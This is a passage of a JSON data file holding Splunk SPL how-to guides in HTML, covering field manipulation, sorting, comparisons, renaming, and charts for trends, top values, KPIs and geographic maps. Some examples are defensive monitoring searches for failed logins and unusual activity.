class=\"guide-group\">\n                    <div class=\"guide-group-header\">Text Manipulation</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Combine fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval full_name = first_name . \" \" . last_name</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Concatenate fields with <code>.</code> (dot). Creates \"John Smith\" from \"John\" and \"Smith\".</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Convert to lowercase</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval user = lower(user)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Normalize case for consistent matching. Also: <code>upper()</code>, <code>trim()</code>.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Handle Missing Values</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Use coalesce for defaults</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | eval user = coalesce(user, src_user, \"unknown\")</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Use first non-null value. If user is empty, try src_user, otherwise use \"unknown\".</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Create multiple fields in one eval: <code>| eval size_mb = bytes/1024/1024, duration_mins = duration/60</code></p>\n                </div>\n            "
      },
      {
        "id": "sort-results",
        "title": "How to sort results",
        "description": "Order your results by any field - highest to lowest, alphabetically, or by time.",
        "keywords": "sort order ascending descending alphabetical top bottom",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to order your results - show the biggest first, the most recent first, or alphabetically.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Basic Sorting</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Sort descending (highest first)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count by user | sort - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">The <code>-</code> means descending. Shows users with most events first.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Sort ascending (lowest first)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count by user | sort + count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">The <code>+</code> means ascending (default). Shows users with fewest events first.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Sort alphabetically</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count by user | sort user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sort by username A-Z. Use <code>- user</code> for Z-A.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Multiple Sort Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Sort by multiple columns</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count by department, user | sort department, - count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Sort by department A-Z first, then by count descending within each department.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Sort by Time</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Most recent first</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | sort - _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Show newest events first. This is usually the default for raw events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Oldest first</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | sort + _time</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Show oldest events first. Useful for timeline analysis.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Limit After Sorting</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Get top 10</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats sum(bytes) as total by user | sort - total | head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 users by bytes transferred.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use <code>sort 0</code> to sort ALL results (removes default 10,000 limit), or <code>sort 100</code> to only return the first 100 after sorting.</p>\n                </div>\n            "
      },
      {
        "id": "compare-values",
        "title": "How to compare values",
        "description": "Filter events using greater than, less than, equals, and other comparisons.",
        "keywords": "compare greater less than equal threshold filter where",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to find events where a value is above a threshold, below a limit, or within a range.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using WHERE for Comparisons</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Greater than / Less than</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | where bytes > 1000000</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events where bytes is greater than 1MB. Also: <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Equals (exact match)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | where status = 200</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Numeric comparison with single <code>=</code> or <code>==</code> in where.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Not equals</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | where status != 200</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">All events where status is anything except 200.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Range Checks</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Between two values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | where bytes >= 1000 AND bytes <= 10000</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Events where bytes is between 1KB and 10KB (inclusive).</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Outside a range</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | where response_time < 100 OR response_time > 5000</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Very fast OR very slow responses (outliers).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Comparing After Aggregation</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Filter aggregated results</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count by user | where count > 100</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find users with more than 100 events.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Compare averages to threshold</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats avg(response_time) as avg_time by endpoint | where avg_time > 1000</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Find endpoints with average response time over 1 second.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Watch Out</div>\n                    <p>Use <code>where</code> for numeric comparisons. The search command (field>100) sometimes works but is less reliable. <code>where</code> always evaluates numerically.</p>\n                </div>\n            "
      },
      {
        "id": "rename-fields",
        "title": "How to rename fields",
        "description": "Give fields clearer names for better readability in reports and dashboards.",
        "keywords": "rename field name as alias column header",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to give fields better names - more readable for reports, or consistent naming across different data sources.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using AS in Stats</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Name your aggregations</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats count as \"Total Events\", dc(user) as \"Unique Users\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Use <code>as</code> to name stats results. Quotes allow spaces in names.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Simple naming</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | stats sum(bytes) as total_bytes by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Without quotes for simple names (no spaces).</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Using the Rename Command</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Rename a single field</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | rename src_ip as \"Source IP\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Changes <code>src_ip</code> to \"Source IP\" for display.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Rename multiple fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | rename src_ip as \"Source IP\", dest_ip as \"Destination IP\", _time as \"Timestamp\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Rename several fields at once, comma-separated.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Rename with wildcards</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>... | rename *_ip as *_address</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Rename src_ip to src_address, dest_ip to dest_address, etc.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Practical Example</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Clean report output</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security\n| stats count as \"Failed Attempts\", dc(src_ip) as \"Unique Sources\" by user\n| rename user as \"Username\"\n| sort - \"Failed Attempts\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Produces a clean, readable report with proper column headers.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Use <code>as</code> in stats when creating fields, use <code>rename</code> when cleaning up existing fields. Both work - pick what's cleaner for your search.</p>\n                </div>\n            "
      }
    ],
    "visualizing": [
      {
        "id": "viz-trends-over-time",
        "title": "How to visualize trends over time",
        "description": "Create time-based charts showing how metrics change over hours, days, or weeks.",
        "keywords": "timechart trend time series line chart graph over time",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to see how something changes over time - like failed logins per hour, errors per day, or traffic volume over a week.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Key Command: timechart</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Basic time trend</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| timechart count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count of failed logins over time. Splunk auto-picks the time interval (span) based on your time range.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Control the time interval</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| timechart span=1h count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count per hour. Use <code>span=15m</code> for 15 minutes, <code>span=1d</code> for daily.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Split by a field (multiple lines)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| timechart span=1h count by src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Creates a separate line for each source IP. Great for comparing patterns.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Limit the number of series</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web status>=500\n| timechart span=1h count by uri limit=10 useother=false</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 URIs only. <code>useother=false</code> hides the \"OTHER\" bucket.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Detect brute force attacks</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security EventCode=4625\n| timechart span=5m count by TargetUserName\n| where count > 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Spike in failed logins for a user in a 5-minute window = potential brute force.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Compare this week vs last week</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web status=200\n| timechart span=1h count\n| eval hour=strftime(_time, \"%H\")\n| stats avg(count) as avg_requests by hour</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Average requests by hour of day - shows your traffic pattern.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Network traffic volume</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=network\n| timechart span=1h sum(bytes) as total_bytes\n| eval total_GB=round(total_bytes/1024/1024/1024, 2)</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Total bytes transferred per hour, converted to GB.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Visualization Tips</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Line chart</strong> - Best for continuous trends over time</li>\n                            <li><strong>Area chart</strong> - Good for showing volume/magnitude</li>\n                            <li><strong>Column chart</strong> - Better for discrete time periods (daily counts)</li>\n                        </ul>\n                        <p>After running your search, click the \"Visualization\" tab and select your chart type.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>If your chart has too many spikes, increase the span. If it's too smooth and hides detail, decrease the span. Match the span to what you're investigating.</p>\n                </div>\n            "
      },
      {
        "id": "viz-compare-categories",
        "title": "How to compare categories",
        "description": "Create bar charts and column charts to compare values across different groups.",
        "keywords": "bar chart column compare categories comparison hosts users top",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to compare values across categories - like which hosts have the most errors, which users generate the most traffic, or which applications are most used.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Key Command: stats + by</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Count by category</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web status>=500\n| stats count by host\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count of errors per host, sorted highest first. Perfect for a bar chart.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Multiple metrics per category</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| stats count as requests, avg(response_time) as avg_response,\n        sum(bytes) as total_bytes by host</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Multiple measurements per host. Great for grouped bar charts.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Using chart command</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security action=*\n| chart count by action, user</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Creates a matrix - rows are actions, columns are users. Good for stacked bars.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Which servers have the most errors?</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=application level=ERROR\n| stats count by host\n| sort -count\n| head 10</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 hosts by error count. Helps prioritize troubleshooting.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: User activity comparison</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| stats dc(url) as unique_sites, sum(bytes) as total_bytes by user\n| eval total_MB=round(total_bytes/1024/1024, 2)\n| sort -total_MB\n| head 20</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Compare users by sites visited and bandwidth used.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Success vs failure by source</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth\n| eval status=if(action=\"success\", \"Success\", \"Failed\")\n| chart count by src_ip, status</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Stacked bar showing success/failure ratio per source IP.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Choosing the Right Chart</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Bar chart (horizontal)</strong> - Best when category names are long</li>\n                            <li><strong>Column chart (vertical)</strong> - Good for fewer categories with short names</li>\n                            <li><strong>Stacked bar</strong> - Shows composition within each category</li>\n                            <li><strong>Grouped bar</strong> - Compares multiple metrics side by side</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Always sort your data and limit to top N results. A bar chart with 100+ categories is unreadable. Use <code>| sort -count | head 10</code> to show just the top 10.</p>\n                </div>\n            "
      },
      {
        "id": "viz-top-offenders",
        "title": "How to show top offenders",
        "description": "Quickly find and display the top N values for any field.",
        "keywords": "top rare bottom highest lowest most least frequent",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to quickly identify the most common (or least common) values - top talkers, most blocked IPs, most frequent errors, etc.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Quick Way: top and rare</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top values</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| top 10 src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 most blocked source IPs. Includes count and percentage automatically.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Rare values (least common)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=endpoint process_name=*\n| rare 10 process_name</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">10 least common processes. Unusual processes might be suspicious.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Top with multiple fields</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth action=failed\n| top 10 user, src_ip</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top user/IP combinations for failed auth. Shows attack patterns.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Top blocked IPs (firewall)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| top 10 src_ip\n| rename src_ip as \"Blocked IP\", count as \"Block Count\", percent as \"% of Total\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Clean table of most blocked IPs, ready for a report.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Heaviest bandwidth users</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| stats sum(bytes) as total_bytes by user\n| sort -total_bytes\n| head 10\n| eval total_GB=round(total_bytes/1024/1024/1024, 2)\n| table user, total_GB</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Top 10 users by bandwidth, shown in GB.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Unusual user agents (threat hunting)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=proxy\n| rare 20 user_agent\n| where count < 5</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">User agents seen fewer than 5 times. Rare agents may indicate malware.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Visualization Options</div>\n                    <div class=\"guide-detail-section\">\n                        <ul>\n                            <li><strong>Bar chart</strong> - Clear comparison of magnitudes</li>\n                            <li><strong>Pie chart</strong> - Shows proportion of total (use sparingly, max 5-7 slices)</li>\n                            <li><strong>Table</strong> - Best when exact numbers matter</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout warning\">\n                    <div class=\"guide-callout-title\">Heads Up</div>\n                    <p>The <code>top</code> command only shows count and percentage. If you need other aggregations (sum, avg), use <code>stats ... | sort -field | head N</code> instead.</p>\n                </div>\n            "
      },
      {
        "id": "viz-single-kpi",
        "title": "How to display a single KPI value",
        "description": "Create dashboard-ready single value displays for key metrics.",
        "keywords": "single value kpi metric number count total dashboard",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to display a single important number - total alerts today, active users, error rate - prominently on a dashboard.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Creating Single Values</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Simple count</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=security severity=critical\n| stats count as critical_alerts</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Total count of critical alerts. Returns one row, one number.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Percentage calculation</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth\n| stats count(eval(action=\"failed\")) as failed, count as total\n| eval failure_rate=round(failed/total*100, 1)\n| fields failure_rate</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Authentication failure rate as a percentage.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">With trend indicator</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web status>=500\n| stats count as current_errors\n| appendcols [search index=web status>=500 earliest=-2d latest=-1d | stats count as yesterday_errors]\n| eval trend=if(current_errors>yesterday_errors, \"up\", \"down\")</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Today's errors with comparison to yesterday. Single value viz can show trend arrows.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Active users right now</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth action=login earliest=-15m\n| stats dc(user) as active_users</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Distinct count of users who logged in the last 15 minutes.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: System uptime percentage</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=monitoring host=webserver01\n| stats count(eval(status=\"up\")) as up_checks, count as total_checks\n| eval uptime_pct=round(up_checks/total_checks*100, 2).\" %\"\n| fields uptime_pct</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Shows \"99.95 %\" - perfect for an uptime dashboard.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Average response time</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=web\n| stats avg(response_time) as avg_ms\n| eval avg_ms=round(avg_ms, 0).\" ms\"</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Average response time with units - \"245 ms\".</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Dashboard Formatting</div>\n                    <div class=\"guide-detail-section\">\n                        <p>When creating single value visualizations in dashboards:</p>\n                        <ul>\n                            <li>Use <strong>color ranges</strong> - green for good, yellow for warning, red for critical</li>\n                            <li>Add <strong>trend indicators</strong> - show if the value is up or down vs. previous period</li>\n                            <li>Include <strong>sparklines</strong> - small inline chart showing recent trend</li>\n                            <li>Set <strong>unit labels</strong> - \"ms\", \"%\", \"GB\" make numbers meaningful</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Format numbers in your search using <code>round()</code> and concatenating units. A KPI showing \"2,847,293\" is hard to read - \"2.85 M\" is much better. Use <code>eval display=round(value/1000000, 2).\" M\"</code></p>\n                </div>\n            "
      },
      {
        "id": "viz-geographic",
        "title": "How to show geographic activity",
        "description": "Map IP addresses to locations and visualize geographic patterns.",
        "keywords": "map geo geographic location ip country city iplocation geostats",
        "body": "\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">The Goal</div>\n                    <div class=\"guide-detail-section\">\n                        <p>You want to see where activity is coming from geographically - map attack sources, visualize user locations, or identify unusual geographic patterns.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 1: Convert IPs to Locations</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Basic IP lookup</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| iplocation src_ip\n| table src_ip, Country, City, Region, lat, lon</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Adds geographic fields to each event. Works with any IP field.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Aggregate by country</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| iplocation src_ip\n| stats count by Country\n| sort -count</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Count of blocked connections per country.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Step 2: Create Map Visualization</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Cluster map with geostats</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| iplocation src_ip\n| geostats count by Country</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Creates a cluster map. Larger circles = more events from that area.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Choropleth (filled map)</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| iplocation src_ip\n| stats count by Country\n| geom geo_countries featureIdField=Country</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Colors countries based on count. Requires the geo_countries lookup.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Real-World Scenarios</div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Where are attacks coming from?</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=firewall action=blocked\n| iplocation src_ip\n| search Country!=United States\n| geostats count by Country</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Map of foreign attack sources, excluding domestic traffic.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: Impossible travel detection</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=auth action=success\n| iplocation src_ip\n| stats earliest(_time) as first_login, latest(_time) as last_login,\n        values(Country) as countries, dc(Country) as country_count by user\n| where country_count > 1</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">Users logging in from multiple countries. Could indicate compromised accounts.</p>\n                    </div>\n                    <div class=\"guide-detail-section\">\n                        <div class=\"guide-detail-label\">Scenario: VPN usage by region</div>\n                        <div class=\"spl-block\">\n                            <pre class=\"spl-code\"><code>index=vpn action=connect\n| iplocation src_ip\n| stats dc(user) as unique_users, sum(bytes) as total_bytes by Country\n| sort -unique_users</code></pre>\n                        </div>\n                        <p class=\"guide-explanation\">VPN connections by country - useful for capacity planning.</p>\n                    </div>\n                </div>\n\n                <div class=\"guide-group\">\n                    <div class=\"guide-group-header\">Available Geographic Fields</div>\n                    <div class=\"guide-detail-section\">\n                        <p>After running <code>iplocation</code>, these fields are 